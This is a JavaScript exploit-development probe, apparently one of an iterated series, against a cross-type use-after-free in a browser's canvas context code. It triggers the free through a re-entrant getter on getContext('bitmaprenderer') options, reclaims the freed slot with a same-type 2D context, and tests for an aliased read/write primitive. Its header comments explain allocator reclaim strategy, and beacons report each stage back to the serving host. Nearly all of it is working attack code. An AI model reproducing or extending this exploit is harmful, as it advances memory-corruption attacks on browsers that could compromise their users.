// p488e — cross-type UAF: clean same-type reclaim (no allocations in between)
//
// V488d result: BITMAP-CHECK then silence, hold stayed OPEN (main thread wedged,
// no watchdog kill). Between the last beacon and the alias report were:
//   a) document.createElement('canvas') + appendChild(nc)   ← layout allocations
//   b) nc.getContext('2d')                                  ← same-type alloc
//   c) dCtx.canvas === nc                                   ← m_canvas read
//   d) report via a pre-created XHR
// Any of a/b/c could have stolen the freed slot or touched bad memory.
//
// This probe removes (a) from the critical window and (d) from the critical path:
//   - nc is created (detached, no appendChild) BEFORE the UAF → no layout work
//     after the free.
//   - The first allocation after the free is nc.getContext('2d') — the cleanest
//     possible same-type LIFO reclaim, valid under FastMalloc and IsoHeap alike.
//   - Alias is checked by pointer identity only (dCtx.canvas === nc); no
//     m_stateStack access, no save(), no AB spray, no state-stack deref.
//   - Reporting uses a fresh XHR (the pattern that worked post-free in V488b),
//     after the alias check has already completed.
//
// Beacon chain: BOOT → BITMAP-CHECK → ALIAS-yes|no → (RW-yes|no) → END
//
// Interpretation:
//   ALIAS-yes + RW-yes → same-type reclaim works; live GC-safe alias confirmed.
//   ALIAS-no           → c2 did not take the slot (free deferred, or different
//                        allocator arena). Browser AB path is dead.
//   ALIAS beacon absent + hold open → nc.getContext('2d') or the canvas getter
//                        wedges even with a clean layout; report the last stage.
//
// Beacon prefix: V488E-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V488E-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);
  window.__dCtx = null;
  window.onerror = function(m, u, l) {
    try { B('ERR', String(m).substring(0, 90) + '@' + l); } catch(e) {}
  };

  try {
    var __hold = new XMLHttpRequest();
    __hold.open('GET', location.origin + '/hold?tag=V488E-' + Date.now(), true);
    __hold.onreadystatechange = function() {};
    __hold.send();
  } catch(e) {}

  var testC = document.createElement('canvas');
  testC.width = 1; testC.height = 1;
  var testBM = null;
  try { testBM = testC.getContext('bitmaprenderer'); } catch(e) {}
  var hasBitmap = !!testBM;
  B('BITMAP-CHECK', 'available=' + hasBitmap + ',type=' + typeof testBM);
  testC = null; testBM = null;
  if (!hasBitmap) { B('ABORT', 'no-bitmaprenderer'); return; }

  // ── Pre-create EVERYTHING before the UAF ──
  // nc stays detached: no layout allocation can race the freed slot.
  var nc = document.createElement('canvas');
  nc.width = 5; nc.height = 5;
  var RQ = new XMLHttpRequest();
  var U_RQ = BASE + '/beacon/V488E-RQ';
  var S_PING = 'ping';

  // ── Cross-type UAF ──
  var dCtx = null, lCtx = null;
  var tc = document.createElement('canvas');
  tc.width = 10; tc.height = 10;
  document.body.appendChild(tc);

  var cc = 0, s = {};
  Object.defineProperty(s, 'alpha', {
    get: function() {
      cc++;
      if (cc === 1) dCtx = tc.getContext('2d');
      return true;
    }
  });

  try {
    lCtx = tc.getContext('bitmaprenderer', s);
  } catch(e) {
    B('OUTER-ERR', String(e && e.message || e));
  }
  window.__dCtx = dCtx;
  window.__lCtx = lCtx;
  if (!dCtx) { B('CROSSTYPE-FAIL', 'dCtx=null,cc=' + cc); return; }

  // ── First allocation after the free: same-type context ──
  var c2 = null;
  try { c2 = nc.getContext('2d'); } catch(e) {}

  // ── Alias: pointer identity only ──
  var alias = false;
  try { alias = !!c2 && (dCtx.canvas === nc); } catch(e) {}

  B('ALIAS-' + (alias ? 'YES' : 'NO'), 'hasC2=' + !!c2 + ',cc=' + cc);

  if (alias) {
    var rw = false;
    try {
      c2.fillStyle = '#abcdef';
      rw = (dCtx.fillStyle === '#abcdef');
    } catch(e) {}
    B('RW-' + (rw ? 'YES' : 'NO'), 'fillStyle');
  }

  // Diagnostic: does the pre-created XHR still work post-free?
  try { RQ.open('POST', U_RQ, false); RQ.send(S_PING); } catch(e) {}

  B('END', 'alias=' + alias);
})();
